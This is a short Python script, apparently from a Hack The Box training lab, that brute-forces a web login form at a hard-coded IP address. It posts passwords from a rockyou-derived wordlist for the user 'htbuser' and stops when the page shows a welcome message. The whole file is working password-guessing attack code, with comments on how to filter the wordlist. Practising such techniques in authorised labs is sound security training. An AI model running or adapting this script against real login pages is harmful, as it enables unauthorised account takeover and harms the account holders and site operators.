# grep the passwords from rock-you-50 by
# grep '[[:upper:]]' rockyou-50.txt | grep '[[:digit:]]'

import requests 
import time 
import re
url = "http://139.59.176.158:32107/"

# userid=abc&passwd=sdf&submit=submit
session = requests.Session()
with open("./pwd_bf.txt") as f:
	wordlist = f.readlines()

for word in wordlist:
	word = word.rstrip()
	data = {
		"userid": "htbuser",
		"passwd": word,
		"submit": "submit"
	}
	r = session.post(url, data=data)
	print("=======================")
	reply = re.findall(r'<strong>(.*)</strong>', r.text)
	print(reply[0])
	print(f"[!] {word} - {r.status_code}")
	if (reply[0] == 'Welcome htbuser!'):
		break
	time.sleep(10)